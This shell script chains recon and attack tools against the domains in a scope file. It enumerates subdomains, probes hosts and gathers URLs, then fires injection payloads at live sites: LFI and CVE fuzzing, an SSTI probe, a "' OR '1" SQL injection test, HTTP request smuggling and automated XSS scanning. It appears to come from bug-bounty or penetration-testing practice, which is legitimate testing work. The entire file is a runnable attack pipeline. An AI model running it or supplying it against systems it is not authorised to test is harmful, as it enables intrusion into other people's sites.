#!/bin/sh
red=`tput setaf 1`
green=`tput setaf 2`
reset=`tput sgr0`
clear
echo '______________________________________________________________________'
echo  "${red} Performing : ${green} Asset Finder ${reset}"
echo '----------------------------------------------------------------------'
cat scope.txt | while read line; do ~/go/bin/assetfinder -subs-only $line | tee -a assets; done
clear
clear
echo '______________________________________________________________________'
echo  "${red} Performing : ${green} Host Discovery ${reset}"
echo '----------------------------------------------------------------------'
cat assets | ~/go/bin/httprobe -prefer-https | tee hosts
clear
echo '______________________________________________________________________'
echo  "${red} Performing : ${green} Urls Gathering ${reset}"
echo '----------------------------------------------------------------------'
cat hosts | sort -u | ~/go/bin/gau | egrep -iv ".(jpg|gif|css|png|woff|pdf|svg|js)" | tee gau
cat hosts | sort -u | while read line; do ~/go/bin/gospider -d 0 -s "$line" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | ~/go/bin/anew | tee -a spider; done
cat gau spider | sort -u | tee -a urls
clear
echo '______________________________________________________________________'
echo  "${red} Performing : ${green} GF Sorting ${reset}"
echo '----------------------------------------------------------------------'
mkdir gfsort
gf --list | while read line; do cat gau | ~/go/bin/gf $line | tee gfsort/$line; done
echo '______________________________________________________________________'
echo  "${red} Performing : ${green} Nuclei and Jaeles Testing per GF ${reset}"
echo '----------------------------------------------------------------------'
echo --------------------------------LFI------------------------------------
cat gfsort/lfi | xargs -I@ ~/go/bin/jaeles scan -c 100 -s ~/jaeles-signatures/fuzz/lfi -u @
cat gfsort/lfi | ~/go/bin/nuclei -t ~/nuclei-templates/fuzzing/ -pbar -o LFI.txt
echo --------------------------------SSTI-----------------------------------
cat gfsort/ssti | xargs -I@ ~/go/bin/jaeles scan -c 100 -s ~/jaeles-signatures/fuzz/ssti -u @
cat gfsort/ssti | ~/go/bin/qsreplace "SSTI{{9*9}}"  | ~/go/bin/httpx -match-regex 'SSTI81' -threads 300 | tee SSTI.txt
echo --------------------------------OPEN REDIRECT--------------------------
cat gfsort/redirect | xargs -I@ ~/go/bin/jaeles scan -c 100 -s ~/jaeles-signatures/fuzz/open-redirect -u @
echo --------------------------------CVEs--------------------------
cat gfsort/interesting* | sort -u | ~/go/bin/nuclei -t ~/nuclei-templates/cves. -pbar -o CVEs.txt
echo --------------------------------SQLi--------------------------
cat gfsort/sqli | qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n" | tee -a SQLi.txt
clear
echo '______________________________________________________________________'
echo  "${red} Performing : ${green} SMUGGLER ${reset}"
echo '----------------------------------------------------------------------'
cat hosts | sort -u | python3 ~/smuggler/smuggler.py -t 4 -q
clear
echo '______________________________________________________________________'
echo  "${red} Performing : ${green} XSS ${reset}"
echo '----------------------------------------------------------------------'
cat gfsort/xss | ~/go/bin/kxss | ~/go/bin/dalfox pipe
